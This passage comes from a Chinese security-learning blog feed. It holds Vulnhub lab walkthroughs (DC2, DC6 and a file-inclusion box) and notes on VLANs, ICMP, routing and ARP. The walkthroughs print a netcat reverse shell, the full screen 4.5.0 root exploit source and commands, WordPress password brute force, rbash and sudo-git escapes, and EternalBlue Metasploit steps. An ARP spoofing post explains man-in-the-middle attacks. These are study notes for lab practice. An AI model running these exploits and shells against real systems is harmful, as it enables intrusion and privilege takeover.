alt></a></p><p>可以看到确实存在文件包含，所以再利用文件包含查看源代码具体看一下是怎样的包含，将显示出的字符串base64解密一下，</p><p><a href="https://imgchr.com/i/BvAIYD" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/11/BvAIYD.png" alt></a></p><h1 id="阶段二：前渗透阶段"><a href="#阶段二：前渗透阶段" class="headerlink" title="阶段二：前渗透阶段"></a>阶段二：前渗透阶段</h1><p><a href="https://imgchr.com/i/BvAqOI" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/11/BvAqOI.png" alt></a></p><p>可以看到这里对于文件包含并没有做出防护措施，所以直接利用这个漏洞来包含一句话木马</p><p><a href="https://imgchr.com/i/BvAztS" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/11/BvAztS.png" alt></a></p><p>在包含之后再利用包含查看服务器端的日志文件</p><pre><code>http://192.168.1.170/thankyou.php?file=/var/log/nginx/access.log</code></pre><p><a href="https://imgchr.com/i/BvEQXR" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/11/BvEQXR.png" alt></a></p><p>日志记录已经包含成功</p><p><a href="https://imgchr.com/i/BvEZkT" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/11/BvEZkT.png" alt></a></p><p>利用蚁剑连接</p><p><a href="https://imgchr.com/i/BvE30x" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/11/BvE30x.png" alt></a></p><p>在执行反弹shell</p><pre class=" language-shell"><code class="language-shell">nc  -e  /bin/bash  192.168.1.170    7744           //反弹shell到7744端口</code></pre><p><a href="https://imgchr.com/i/BvEOgJ" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/11/BvEOgJ.png" alt></a></p><p>在接受到反弹shell之后利用python实现交互式shell</p><pre class=" language-shell"><code class="language-shell">nc -lvvp 7744                       //端口监听python -c 'import pty;pty.spawn("/bin/bash")'         //实现交互式shell</code></pre><p><a href="https://imgchr.com/i/BvVpE6" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/11/BvVpE6.png" alt></a></p><h1 id="阶段三：后渗透阶段"><a href="#阶段三：后渗透阶段" class="headerlink" title="阶段三：后渗透阶段"></a>阶段三：后渗透阶段</h1><p>在拿到shell之后我们就要想到怎么提权了，先利用命令查看能够执行root权限的文件，</p><pre class=" language-shell"><code class="language-shell">find / -perm /4000 2>/dev/null</code></pre><p><a href="https://imgchr.com/i/BvVfPO" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/11/BvVfPO.png" alt></a></p><p>发现了screen4.5.0，然后在msf中search一波，发现有screen4.5.0的exp，</p><p><a href="https://imgchr.com/i/BvVbZt" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/11/BvVbZt.png" alt></a></p><p>copy一手41154.sh，再cat一下，（41154.sh是不能直接进行编译的）</p><p>这里我看了很wp最后发现是需要我们创建两个c语言文件，然后将这两个文件进行编译之后产生的新文件通过蚁剑上传到靶机，其中libhax.c的代码如下：</p><p><a href="https://imgchr.com/i/BvVjJS" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/11/BvVjJS.png" alt></a></p><pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token function">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>__constructor__<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">void</span> <span class="token function">dropshell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">chown</span><span class="token punctuation">(</span><span class="token string">"/tmp/rootshell"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">chmod</span><span class="token punctuation">(</span><span class="token string">"/tmp/rootshell"</span><span class="token punctuation">,</span> <span class="token number">04755</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"/etc/ld.so.preload"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] done!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>然后命令行上执行：</p><pre class=" language-shell"><code class="language-shell">gcc -fPIC -shared -ldl -o libhax.so libhax.c</code></pre><p>rootshell.c的代码如下：</p><p><a href="https://imgchr.com/i/BvZ9Ln" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/11/BvZ9Ln.png" alt></a></p><pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">setuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setgid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">seteuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setegid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">execvp</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>然后执行以下命令：</p><pre class=" language-shell"><code class="language-shell">gcc -o rootshell rootshell.c</code></pre><p>注意：这两个文件一定要进行编译，而在进行编译之后会产生两个同名的文件，而我们真正的提权工具就是这两个新产生的文件。</p><p>然后将两个文件通过蚁剑上传到靶机上的/tmp下，</p><p><a href="https://imgchr.com/i/BvZid0" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/11/BvZid0.png" alt></a></p><p>然后在我们的交互式shell窗口cd到/tmp/etc下执行以下命令：</p><pre class=" language-shell"><code class="language-shell">cd /tmp/etc                    //转到tmp下的etc文件中umask 000                       screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"           //构造exp/tmp/rootshell          //实现提权</code></pre><p><a href="https://imgchr.com/i/BvZVWF" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/11/BvZVWF.png" alt></a></p><p>然后进入到root目录下查看flag</p>]]></content>
      
      
      <categories>
          
          <category> web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulbhub-DC2</title>
      <link href="/2020/11/05/vulbhub-DC2/"/>
      <url>/2020/11/05/vulbhub-DC2/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h1><p>在布置好靶场之后我们利用相关工具进行一波内网扫描，我这里用的是自己找的扫描软件，可以推荐用nmap，</p><p><a href="https://imgchr.com/i/Bfgrp6" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/06/Bfgrp6.png" alt></a></p><p>在扫描出相应的IP地址之后直接访问发现访问不了，治理是由于我们本地的解析问题，需要我们对host文件进行更新，Windows下是在C:\Windows\System32\drivers\etc中的host文件中进行更新，在更新完成之后我们可以直接访问靶场页面。</p><p><a href="https://imgchr.com/i/Bfgvhq" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/06/Bfgvhq.png" alt></a></p><p>打开之后发现是wordpress4.7.10版本的博客，可以发现flag1。</p><p><a href="https://imgchr.com/i/Bf2wDg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/06/Bf2wDg.png" alt></a></p><h1 id="2-用户收集和尝试爆破"><a href="#2-用户收集和尝试爆破" class="headerlink" title="2.用户收集和尝试爆破"></a>2.用户收集和尝试爆破</h1><p>提示让我们使用cewl，所以我们首先用wpscan扫描网站的用户命令如下：</p><pre class=" language-shell"><code class="language-shell">wpscan --url dc-2 --enumerate u</code></pre><p><a href="https://imgchr.com/i/Bf2c80" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/06/Bf2c80.png" alt></a></p><p>可以看到有admin，jerry，Tom三个用户，在flag1中提示使用cewl，这是一个kali中用于爬取指定URL指定深度的ruby应用，然后将所爬取的内容通过指令输出到指定的文件夹中，在这个靶场中我们用到的命令如下：</p><pre class=" language-shell"><code class="language-shell">cewl -w pwd.txt dc-2       将爬取的内容输出到pwd.txt文件中cat pwd.txt            顺便查看一下爬取结果wpscan --url dc-2 -P pwd.txt -U admin         爆破admin的密码，不用想了肯定爆破不出来wpscan --url dc-2 -P pwd.txt -U jerry             爆破jerry的密码，这个是可以得到的wpscan --url dc-2 -P pwd.txt -U tom               爆破tom的密码，这个也可以得到</code></pre><p><a href="https://imgchr.com/i/BfR9PI" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/06/BfR9PI.png" alt></a></p><p><a href="https://imgchr.com/i/BfRKGq" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/06/BfRKGq.png" alt></a></p><h1 id="3-后台登入"><a href="#3-后台登入" class="headerlink" title="3.后台登入"></a>3.后台登入</h1><p>然后我们使用jerry的账号进行登入wordpress得到后台，这里提示一下一般wordpress的默认登录页面为wp-login.php我们在登录jerry的账号之后发现了flag2提示我们换一种方法进行渗透。</p><p><a href="https://imgchr.com/i/BfRKGq" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/06/BfRKGq.png" alt></a></p><h1 id="4-ssh连接和提权"><a href="#4-ssh连接和提权" class="headerlink" title="4.ssh连接和提权"></a>4.ssh连接和提权</h1><p>然后，我们这时候肯定会感觉抓瞎，而我们在信息收集的时候是不是发现了一个ssh端口，这时候我们通过kali利用tom的账号连接靶机发现连接成功，命令如下：</p><pre class=" language-shell"><code class="language-shell">ssh tom@192.168.146.140 -p 7744</code></pre><p><a href="https://imgchr.com/i/BfWESx" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/06/BfWESx.png" alt></a></p><p>在连接成功之后，ls一下发现了flag3.txt文件，cat一下，发现没有权限，根据提示我们发现tom用户呗rbash了，所谓的rbash就是受限制的shell，瞬间感觉tom用户是真的卑微，不过我们可以直接vi flag3.txt这样我们就可以看到其中的内容。</p><p><a href="https://imgchr.com/i/BfWu0e" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/06/BfWu0e.png" alt></a></p><p>打开之后发现解释是tom很老了，也许他需要用其他的方式来抓老鼠，实际上就是提示我们提升tom用户的权限，我在看了很多的提权方法之后，觉得是tom用户权限受限制的原因是环境变量的原因，那么我们下一步就是改变tom的环境变量，命令如下</p><pre class=" language-shell"><code class="language-shell">BASH_CMDS[a]=/bin/sh   ;   a        #调用bin文件下的sh命令解释器/bin/bash   #使用bash命令解释器export PATH=PATH:/bin:/sbin:/usr/bin:/usr/sbin  #设置环境变量</code></pre><p><a href="https://imgchr.com/i/BfW8pt" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/06/BfW8pt.png" alt></a></p><p>在设置好环境变量之后我们就可以用cd命令，也就是说我们的权限成功提升了，cd到/home下我们看到jerry用户进入jerry用户的文件，看到了flag4.txt文件，我们cat一下发现文件提示我们利用git，所以我们su一下到jerry用户，发现jerry用户可以以root的权限来运行git，这就是一个可以提权的点.</p><p><a href="https://imgchr.com/i/BfWU0g" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/06/BfWU0g.png" alt></a></p><p>然后利用命令</p><pre class=" language-shell"><code class="language-shell">sudo git help config  #进入文件!/bin/bash           #成功提权</code></pre><p><a href="https://imgchr.com/i/BfWhN9" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/06/BfWhN9.png" alt></a></p><p><a href="https://imgchr.com/i/BfWI91" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/06/BfWI91.png" alt></a></p><p>我们在成功提权之后直接进入到root目录下就可以看到最终的flag.</p>]]></content>
      
      
      <categories>
          
          <category> web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub中的wordpress靶场</title>
      <link href="/2020/10/27/vulnhub%E4%B8%AD%E7%9A%84wordpress%E9%9D%B6%E5%9C%BA/"/>
      <url>/2020/10/27/vulnhub%E4%B8%AD%E7%9A%84wordpress%E9%9D%B6%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="vulnhub的介绍"><a href="#vulnhub的介绍" class="headerlink" title="vulnhub的介绍"></a>vulnhub的介绍</h1><p>最近刚开始学习web渗透，也搭建了一个vulnhub的靶场，在这里我介绍一下vulnhub靶场，这是一个公开的免费的web渗透靶场，我们在选好相关目标靶场之后下载靶场的相关压缩文件，解压后直接在虚拟机中打开就可以了（你所下载的压缩包其实就是一个虚拟机文件的压缩版），然后在开机之后就可以开始你的渗透之旅了。</p><h1 id="web渗透的简单了解（本人的见解欢迎指正）"><a href="#web渗透的简单了解（本人的见解欢迎指正）" class="headerlink" title="web渗透的简单了解（本人的见解欢迎指正）"></a>web渗透的简单了解（本人的见解欢迎指正）</h1><p>以我现在了解的了解web渗透分大体分为：信息收集，漏洞发现，漏洞利用拿到shell（在我看来到此为前渗透阶段），拿到shell之后利用漏洞进行提权，执行自己的目的操作（比如打爆服务器的数据），留下后门，删库跑路（至此为后渗透阶段）。</p><p>反弹shell：就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端，而我们常见的web中利用反弹shell拿到shell的原理就是利用各种软件的漏洞执行相关命令让目标PC主动连接我们的攻击机，从而完成前渗透阶段的最后一步。</p><h1 id="vulnhub中的woerdpress靶场（DC6）"><a href="#vulnhub中的woerdpress靶场（DC6）" class="headerlink" title="vulnhub中的woerdpress靶场（DC6）"></a>vulnhub中的woerdpress靶场（DC6）</h1><p>此靶场主要利用wordpress的Plainview Activity Monitor插件的漏洞来拿到shell，原理是可以从这个插件中传输数据中做手脚从而能够远程执行恶意代码，wordpress官方的公告为：<a href="http://blog.nsfocus.net/cve-2018-15877/" target="_blank" rel="noopener">http://blog.nsfocus.net/cve-2018-15877/</a> ，而我们的攻击机kali中的msf就具有对此插件的相关攻击模块。</p><p>我们进行渗透过程中会用到WPScan这个工具，此工具为Kali自带的一款漏洞扫描工具，它采用Ruby编写，能够扫描WordPress网站中的多种安全漏洞，它不仅能够扫描类似robots.txt这样的敏感文件，而且还能够检测当前已启用的插件和其他功能。</p><p>靶场渗透提示：wordpress的默认后台登录页面为wp-login.php。</p><p>具体渗透操作请参考大佬博客：<a href="https://www.cnblogs.com/-chenxs/p/12060347.html" target="_blank" rel="noopener">https://www.cnblogs.com/-chenxs/p/12060347.html</a> 或者 <a href="https://www.jianshu.com/p/fbb357ebf1cf" target="_blank" rel="noopener">https://www.jianshu.com/p/fbb357ebf1cf</a></p>]]></content>
      
      
      <categories>
          
          <category> web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>单臂路由和ICMP协议</title>
      <link href="/2020/09/18/%E5%8D%95%E8%87%82%E8%B7%AF%E7%94%B1%E5%92%8CICMP%E5%8D%8F%E8%AE%AE/"/>
      <url>/2020/09/18/%E5%8D%95%E8%87%82%E8%B7%AF%E7%94%B1%E5%92%8CICMP%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="单臂路由"><a href="#单臂路由" class="headerlink" title="单臂路由"></a>单臂路由</h1><p>我们在设置好vlan之后如果连接同一台交换机的PC在不同的vlan之中是没有办法进行通信的（相当于处于不同的vlan的PC是处于不同的局域网），这样一来我就需要用到单臂路由（虽然现在被淘汰了），单臂路由的具体实现是在原本的路由器的接口处分生出子接口而不同的vlan则连接不同的子接口，而实现不同vlan之间的通信就需要用到这些子接口，具体过程为：在vlan2中的一台PC想要同vlan3中的一台PC进行通信的话在数据帧经过交换机之后会传到路由器，再从路由器的借口接收到数据帧之后会对所收数据帧在判断所属是哪一个vlan之后会将数据帧传输到该vlan的子接口，然后子接口在对所收数据帧进行解封装之后在根据路由表进行路由转发，也就是说每一个子接口就相当于一台路由器，而我们原本的物理路由器就是这些“路由器”的集合，由于将整体的抽象图画出之后根据图像从而称之为单臂路由（本人自己猜测）。</p><p>具体的单臂路由配置过程我就不在这里说了，每一个牌子的路由器的命令有所不同，需要自己去把路由器的命令手册dang下来自己研究。</p><h1 id="ICMP协议"><a href="#ICMP协议" class="headerlink" title="ICMP协议"></a>ICMP协议</h1><p>我们通常ping其他PC时所用的协议你可能会认为是强大的TCP协议，但实际上真正实现这个功能的是ICMP协议，ICMP协议属于是TCP/IP五层协议的第三层，且ICMP协议没有具体的端口号，ICMP协议具体用处为：1.网络探测 2.路由跟踪 3.错误反馈。ICMP协议数据的封装格式为：ICMP头+数据，而ICMP头中的则为ICMP类型+代码。其中，数据这一板块芝士味确认你收到了这个包，其中的内容都是些无意义的数据。而ICMP类型则是为了表现出你返回的ICMP包是什么类型，例如：是正常回包还是错误回包。而之后的类型则是为了表现出错误回包是什么类型。如果你的返回包不是错误的ICMP类型的值会与代码的值相同。</p><h2 id="几种ICMP类型的说明"><a href="#几种ICMP类型的说明" class="headerlink" title="几种ICMP类型的说明"></a>几种ICMP类型的说明</h2><p>ICMP的类型值有很多我接下来只说明几种：</p><p>1.若类型值为8则是ping请求包。</p><p>2.若类型值为0则为ping应答包。</p><p>3.若类型值为3则为目标主机不可达的错误回包，也就是这种类型的ICMP包之后的代码值会与类型值不同，而不同的代码值对应不同的回包。</p><p>4.若类型值为11则为TTL超时的数据包，这种回包可用于路由追踪（可以返回ping的过程中所经历的路由器IP地址）。而实现路由追踪的命令Windows为: tracert+IP地址       Linux为：traceroute+IP地址</p>]]></content>
      
      
      
        <tags>
            
            <tag> web基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vlan的了解</title>
      <link href="/2020/09/16/vlan%E7%9A%84%E4%BA%86%E8%A7%A3/"/>
      <url>/2020/09/16/vlan%E7%9A%84%E4%BA%86%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="vlan产生的原因"><a href="#vlan产生的原因" class="headerlink" title="vlan产生的原因"></a>vlan产生的原因</h1><p>在局域网中，由于我们的PC会经常性的发送广播，例如ARP广播，交换机的广播等等，我们的PC对于广播会直接接收，如果广播的内容对于我们自身的PC无用则会被丢弃，而如果一个局域网中连接的PC数量较多的话我们的PC则会运行直接“爆炸“，同时也是为了防止局域网中的广播攻击，于是就有了vlan这一技术。</p><h1 id="vlan的介绍"><a href="#vlan的介绍" class="headerlink" title="vlan的介绍"></a>vlan的介绍</h1><p>vlan主要是部署在交换机上的一种技术，我们日常生活中所用的路由器则没有这种技术，一般管理型的交换机会具有这种技术，vlan的具体实现原理为将同一局域网分为不同的虚拟局域网，简单来说就是让同一局域网中的PC相当于位于不同局域网，这样一来就会缩减广播域，减少每一台PC的接收广播的负担，而vlan实现这样工作的原理就是在交换机接收你的数据包之后跟据数据包中的MAC地址进行转发，但是在转发到目标PC连接的端口时目标端口会检查数据包来源是不是和自己在同一vlan如果不是数据包则会被丢弃，如果是则会让其通过。</p><h1 id="vlan的部署"><a href="#vlan的部署" class="headerlink" title="vlan的部署"></a>vlan的部署</h1><p>vlan的部署我了解的有三种，第一种vlan的部署是基于交换机连接端口的部署，举个例子，一台交换机上部署有两个vlan，分别为vlan1和vlan2，分别连接有两台PC如果这两台PC交换连接的福安口，那么这两台PC就会转换所处的vlan。第二种则是基于MAC地址的vlan，它和第一种相似之处都是需要手工配置，但是他会根据所连接的PC的MAC地址来进行vlan的转换。第三种则需要账号密码验证机制，其中原理我了解不多所以就不说了，但这种机制只需要你输入账号密码在验证通过之后就会为你的PC动态设置所属vlan，这种机制也是则方便的机制。</p><h1 id="vlan中的trunk"><a href="#vlan中的trunk" class="headerlink" title="vlan中的trunk"></a>vlan中的trunk</h1><p>我们在设置好同一台交换机上的vlan之后，在连接其他配置好vlan的交换机后我们会发现在同一个vlan上但连接不同的交换机的PC之间不能够通信，所以vlan中的trunk技术就有用了，由于交换机之间互相连接的端口一般是属于vlan1的而我们自己如果配置好vlan的话一般就造成了这个连接端口与其他vlan分开，而不同vlan之间又不能通信，而trunk技术的作用就是让这个交换机之间互相连接的端口不属于任何一个vlan，这样所有的vlan数据就都能够通过这个公共链路进行传输。</p><h1 id="trunk的注意事项"><a href="#trunk的注意事项" class="headerlink" title="trunk的注意事项"></a>trunk的注意事项</h1><p>trunk帮助我们解决了不同交换机之间相同vlan的通信，但是数据在传输到另一台交换机之后是怎么识别数据来自哪一个vlan的又是一个问题，这里trunk中配备的有一个协议具体如下：在交换机收到来自不同vlan的数据之后会将这个数据打上一个标签，在另一台交换机收到数据上之后会将解除这个标签并且确认数据的来源是哪一个vlan，之后再进行传输。而这个打标签的方法目前有两种分别为：lsl标签这个为Cisco公司私有的打上标签的方法，具体为将你的数据帧前加上一个26字节的数据同时也会在你的数据帧后加上一个4个字节的数据，另一种则为802.1q，这个是国际公共的加标签的协议，具体为在你的数据帧中间加上4个字节的数据。</p><p>vlan中连接PC的端口我们一般称之为接入端口，只能属于一个vlan也只能传输一个vlan的数据，而像那种连接不同交换机的端口则为中继端口，也称之为公共端口，能够允许所有vlan的数据通过。</p><p>注意：交换机在接收到带有标签的数据震后是会吧数据标签拿下来鉴定数据传输的具体端口之后再进行转发，而标签呗拿下来之后就会被丢弃不会再被加上，我们的PC不能识别带有标签的数据帧！</p>]]></content>
      
      
      
        <tags>
            
            <tag> web基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MSF中的永恒之蓝</title>
      <link href="/2020/08/18/MSF%E4%B8%AD%E7%9A%84%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/"/>
      <url>/2020/08/18/MSF%E4%B8%AD%E7%9A%84%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="永恒之蓝漏洞"><a href="#永恒之蓝漏洞" class="headerlink" title="永恒之蓝漏洞"></a>永恒之蓝漏洞</h1><p>永恒之蓝漏洞是于2017年发布的漏洞，可以说是一个危害性很大的漏洞，不过在此漏洞发布后不久各大厂商都做出了相关的补丁，有兴趣的可以去360上查看补丁。而永恒之蓝漏洞利用的主要是SVB这个协议，而所利用的我们PC上的445端口（所以平常别乱开445有点危险-.-），这里由于我自己也不太明白漏洞原理，所以就只介绍漏洞的使用方法了。</p><p>首先，准备kali和Windows7的虚拟机（Windows2003，2008，xp都可以，但不要尽量装最新的杀毒软件），在kali’的终端输入msfconsole进入msf然后输入use exploit/windows/smb/ms17_010_eternalblue(不确定命令的正确性的话可以同tab补全)，进入永恒之蓝的攻击页面，在进行攻击之前需要我们进行一些目标主机的设置和攻击者的设置，输入命令set RHOST 192.168.1.112（攻击目标IP），然后设置payload（攻击载荷，连接目标主机与本机的通道）命令如下：set payload windows/x64/meterpreter/reverse_tcp 调用攻击载荷，后设置攻击主机set lhost 192.168.1.113，后在命令行exploit发起攻击，攻击成功之后我们一般拿到的时system的权限，也就是最高权限，也就是说我们拿到了webshell。</p>]]></content>
      
      
      
        <tags>
            
            <tag> web中的渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基础知识补充</title>
      <link href="/2020/07/24/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/"/>
      <url>/2020/07/24/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h1><p>在我们日常生活中总能听到路由器这个名讽刺，我们日常所用家用路由器实际上可以说是一个三层交换机（交换机和路由器的集合体）,用企业的网络来说，最基本的网络由交换机和PC构成内网，再由路由器构成网关，而路由器则和外网连接，也就是说我们的PC和互联网的连接点为路由器，而路由器转发数据的过程就称为路由，那么，路由器是如何转发数据的，这里我们利用下方的简单图形进行说明，IP为10.1.1.1的PC想要利用ping来ping其他网段的PC，首先，PC会检查对方是否与自己在同一网段，如果不是则会发送ARP广播向本网段的路由器请求路由器的MAC地址，然后封装包头，将数据帧送往路由器，路由器的入接口在收到数据帧后会先将数据帧的包头解封装。这时候路由器自身内部会有一个表，我们称之为路由表，而路由表中记录的是IP地址，凡是路由器收到数据帧解封装后，会将数据帧中的目标IP与自己的路由表进行比对，如果比对相同则会将数据帧转至路由器的出接口准备进行转发，如果不同则会将数据帧丢弃，然后我们接着上边继续，路由器在与自己的路由表进行比对之后发现目标IP与自己的路由表相匹配，将原本数据转至路由器的出接口，在这时路由器的出接口想要进行对数据的封装，但没有目标的MAC地址，所以会暂时停止对数据的封装，利用ARP协议向20.1.1.0网段的网关发送ARP广播来获取对方的MAC地址然后再进行包头的封装，发送数据帧，而20.1.1.0网段的路由器也就是网关在收到数据帧后会对数据解封装然后再进行路由表的比对，然后再利用ARP广播20.1.1.1的MAC地址，将数据封装之后送至IP地址为20.1.1.1的PC。</p><p><img src="https://s1.ax1x.com/2020/07/25/Uz66tx.png" alt="实例"></p><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>以上所讲的是路由的基本过程，如果想要是路由器的功能更齐全的话，只会向这其中进行插入，例如VPN的功能，NAT，PAT等路由器的功能均是向以上所讲的过程之中进行插入。</p>]]></content>
      
      
      <categories>
          
          <category> web基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ARP协议/中间人攻击</title>
      <link href="/2020/07/13/ARP%E5%8D%8F%E8%AE%AE-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
      <url>/2020/07/13/ARP%E5%8D%8F%E8%AE%AE-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="ARP协议的叙述（需要了解一些基本知识）"><a href="#ARP协议的叙述（需要了解一些基本知识）" class="headerlink" title="ARP协议的叙述（需要了解一些基本知识）"></a>ARP协议的叙述（需要了解一些基本知识）</h1><p>ARP协议是我们得PC用来获取目标MAC地址所需要的一种协议，举个例子，如果我们在ping同一局域网某一台PC时，我们所发的ping的请求是以帧的形式通过交换机，然后再由交换机发往所ping的PC。我们如果想要实现ping通一台PC就需要目标PC的MAC地址和IP地址，通常我们在ping的时候就已经知道目标IP地址，但不知道MAC地址，所以在我们的ping的帧从我们的PC发出之前，我们必须得要知道目标PC得IP地址，所以这时候据需要发送APR请求用来获取目标的MAC地址而过程大致为：（以源IP10.1.1.1，目标IP10.1.1.2）</p><p>我们先发送一个广播，广播中的目标MAC地址为广播地址也就是12个F，广播内容大致为：我是10.1.1.1，我的MAC地址为AA，谁是10.1.1.2，请把你的MAC地址给我，然后在这个局域网中的所有PC都会收到这个广播，然后将这个广播报文进行帧头和帧尾的去除，然后每一个PC利用ARP协议将目标IP与自己的IP进行比对，如果正确，则会通过单播应答的方式，对回发自己的MAC地址，10.1.1.1在收到这个回包之后就会将10.1.1.2的MAC地址放到目标MAC地址处，发到交换机处，在由交换机转发到目标PC</p><h1 id="ARP的相关注意事项"><a href="#ARP的相关注意事项" class="headerlink" title="ARP的相关注意事项"></a>ARP的相关注意事项</h1><p>ARP的报文只能在局域网之间转发，不同的局域网不能转发。<br>在我们接收ARP报文的时候我们的PC会在自己本机形成一个ARP缓存，这个ARP缓存可以通过cmd或者powershell来查看，命令为</p><blockquote><p>arp -a</p></blockquote><p>我们的ARP缓存会在我们的PC上存在一段时间（毕竟是缓存），当然我们PC上的静态ARP缓存不会消失。ARP协议有一个弊端就是如果收到两份相同的ARP回包它只会学习最新收到的回包，将原有的相同的MAC地址缓存进行更新。（这就是中间攻击原理）</p><h1 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h1><p>在上边我已经说了ARP的弊端，接下来就要说怎么利用了，在同一局域网中，有三台机器地址分别为10.1.1.1，10.1.1.2，10.1.1.3，我以10.1.1.2为攻击者，其他两个为被攻击者，10.1.1.2向10.1.1.1发送ARP报文内容大致为：我是10.1.1.3，我的MAC地址为AA，同时也向10.1.1.3发送ARP报文内容大致为：我是10.1.1.1，我的MAC地址为AA，此时10.1.1.1和10.1.1.3两台PC上的ARP缓存都接受ARP报文并进行了更新，此时如果10.1.1.1向10.1.1.3发送信息就会先流经10.1.1.2然后转往10.1.1.3，同样10.1.1.3发往10.1.1.1的信息也是如此，然后我们就可以利用相关软件来进行信息的窃取或者修改，具体软件我就不多说了<del>（kali的ettrecap）</del></p>]]></content>
      
      
      
        <tags>
            
            <tag> web基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>知识补充1</title>
      <link href="/2020/05/11/%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%851/"/>
